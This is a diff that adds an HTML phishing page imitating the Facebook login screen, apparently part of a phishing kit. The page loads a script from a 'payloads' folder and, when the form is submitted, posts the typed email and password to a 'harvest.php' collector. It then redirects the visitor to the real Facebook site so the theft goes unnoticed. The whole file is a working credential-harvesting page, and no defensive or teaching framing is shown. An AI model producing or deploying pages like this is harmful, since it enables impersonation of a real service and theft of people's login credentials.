@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook - Log In</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #f0f2f5; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .login-box { background: white; padding: 40px; border-radius: 8px; width: 400px; text-align: center; }
+        h1 { color: #1877f2; font-size: 40px; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; }
+        button { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
+    </style>
+    <script src="../payloads/collector.js"></script>
+</head>
+<body>
+    <div class="login-box">
+        <h1>facebook</h1>
+        <form id="loginForm">
+            <input type="text" id="email" placeholder="Email or Phone Number" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            await fetch('../php/harvest.php', {
+                method: 'POST',
+                body: JSON.stringify({ type: 'credentials', data: { email: document.getElementById('email').value, password: document.getElementById('password').value } })
+            });
+            window.location.href = 'https://www.facebook.com';
+        });
+    </script>
+</body>
+</html>
